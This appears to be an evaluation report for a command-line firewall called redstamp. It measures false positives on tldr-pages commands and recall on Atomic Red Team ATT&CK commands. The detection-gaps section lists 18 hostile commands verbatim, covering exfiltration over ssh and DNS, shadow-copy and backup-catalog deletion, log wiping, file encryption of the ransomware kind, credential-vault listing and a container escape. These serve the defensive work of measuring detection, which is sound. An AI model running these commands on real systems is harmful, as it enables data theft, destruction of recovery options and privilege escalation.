# Third-party corpus results

> redstamp scored against corpora **nobody here wrote** — the neutrality test the arena README calls for. Precision on external benign commands, recall on external attacks, reported straight. Regenerate: `node arena/thirdparty.mjs`.

## tldr-pages — benign precision (CC-BY-4.0)

Source: 1212 real command examples from [tldr-pages](https://github.com/tldr-pages/tldr) `pages/common` @ `63e425aea1`, placeholder-substituted, destructive/dual-use utilities excluded (a firewall should gate those). See provenance in the corpus file.

- **Precision: 100% — 0 hard false-positives of 1212.**
- Friction (benign escalated to review, a softer signal): 11/1212 — all defensible outward-facing/dual-use shapes (`git push`, `npx`, a credentials-file scan).

A large external benign set with zero hard false-positives is the number that matters most: a firewall that fires on real work gets disabled, and a disabled firewall catches nothing.

## Atomic Red Team — external ATT&CK attacks + benign (MIT)

Source: 203 commands from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) @ `2c63affb3b` across 45 ATT&CK techniques. Labels assigned by security principle per technique (not "it's in Atomic → block"); see the corpus provenance for the full methodology.

**Read this axis-aware.** redstamp classifies command *semantics*. Atomic Red Team also ships tests that run a pre-staged binary (`mimikatz.exe`, `gsecdump.exe`) — whose maliciousness is in the binary's reputation, not the command string. No command-string firewall can catch those without a binary-reputation feed; they are a documented axis limit, exactly as LlamaFirewall is read on the injection slice only. Each sample is tagged `command-semantic` vs `opaque-binary`.

| slice | metric | result |
|---|---|---|
| block · command-semantic (redstamp's axis) | hard-block recall | **10/31 (32%)** |
| block · command-semantic | +gate recall (block or escalate) | 13/31 (42%) |
| block · opaque-binary (out of axis) | hard-block recall | 6/42 (14%) — documented limit |
| approve · dual-use | escalated (block or gate) | 9/59 (15%) |
| allow · discovery | **precision** (0 FP = perfect) | **0 FP / 71** (100%), 2 gated |

**Honest read.** Precision holds on external benign discovery (0 false-positives of 71) — consistent with the tldr result. But on-axis attack recall is **32%**: an outside ATT&CK corpus catches redstamp missing real command-semantic attacks its own corpus never exercised. That gap is the corpus earning its keep — the misses below are concrete, fixable detection work, not noise.

### On-axis detection gaps (18) — attacks redstamp should catch but does not

These are command-semantic attacks (redstamp's axis) that a correct firewall should block or escalate. Each is a candidate detection rule. (A bulleted list, not a table, so pipes and backslashes in the commands render verbatim.)

- **T1041** (currently `allow`) — `if(-not (Test-Path $env:TEMP\LineNumbers.txt)){ 1..100 | ForEach-Object { Add-Content -Path $env:TEMP\LineNumb`
- **T1041** (currently `allow`) — `$dnsServer = "dns.example.com" $exfiltratedData = "SecretDataToExfiltrate" $chunkSize = 63 $encodedData = [Sys`
- **T1048** (currently `allow`) — `ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz`
- **T1048** (currently `allow`) — `tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc`
- **T1070** (currently `allow`) — `fsutil usn deletejournal /D C:`
- **T1485** (currently `allow`) — `dd of=/var/log/syslog if=/dev/zero count=$(ls -l /var/log/syslog | awk '{print $5}') iflag=count_bytes`
- **T1485** (currently `allow`) — `gcloud config set project atomic-test-1 gcloud storage buckets delete gs://atomic-red-team-bucket`
- **T1486** (currently `allow`) — `echo "passwd" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo AES-256 -o /tmp/passwd.gpg -c /etc/pa`
- **T1486** (currently `allow`) — `$which_7z a -ppasswd /tmp/passwd.zip /etc/passwd`
- **T1486** (currently `allow`) — `which_ccencrypt='which ccencrypt' cp /etc/passwd /tmp/passwd; $which_ccencrypt -T -K passwd /tmp/passwd`
- **T1486** (currently `allow`) — `which_openssl='which openssl' $which_openssl genrsa -out /tmp/key.pem 2048 $which_openssl rsa -in /tmp/key.pem`
- **T1486** (currently `allow`) — `echo T1486 - Purelocker Ransom Note > %USERPROFILE%\Desktop\YOUR_FILES.txt`
- **T1486** (currently `allow`) — `7z a -p ARTPass -mhe=on ARTArchive.7z ~/test.txt`
- **T1490** (currently `allow`) — `wbadmin delete catalog -quiet`
- **T1490** (currently `allow`) — `Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}`
- **T1555** (currently `allow`) — `vaultcmd /listcreds:"Windows Credentials" /all`
- **T1555** (currently `allow`) — `vaultcmd /listcreds:"Web Credentials" /all`
- **T1611** (currently `allow`) — `kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --`

_Themes: exfil over ssh/tar and DNS; inhibit-recovery variants (`fsutil usn deletejournal`, `wbadmin delete catalog`, WMI shadow-copy delete); ransomware-shaped encryption of system files (`gpg -c /etc/passwd`, `7z -p`, `ccencrypt`, `openssl`); `dd` overwrite of a logfile; `kubectl` privileged-pod escape; credential-store enumeration (`vaultcmd`). Closing these raises real-world recall AND a future Atomic Red Team score._

## Provenance & licenses

- **tldr-pages** — CC-BY-4.0. © tldr-pages team and contributors, licensed CC-BY-4.0. Commands extracted from pages/common and placeholder-substituted; this is a derived subset, not the original pages.
- **Atomic Red Team** — MIT. Atomic Red Team™ by Red Canary, MIT License. Command strings extracted from atomics/<technique>/<technique>.yaml executor blocks with input-argument defaults substituted; this is a derived subset.

See [THIRD-PARTY-CORPORA.md](THIRD-PARTY-CORPORA.md) for the full license map (including corpora we deliberately did NOT vendor for license reasons) and the import roadmap. MIT for redstamp's own code and tooling.
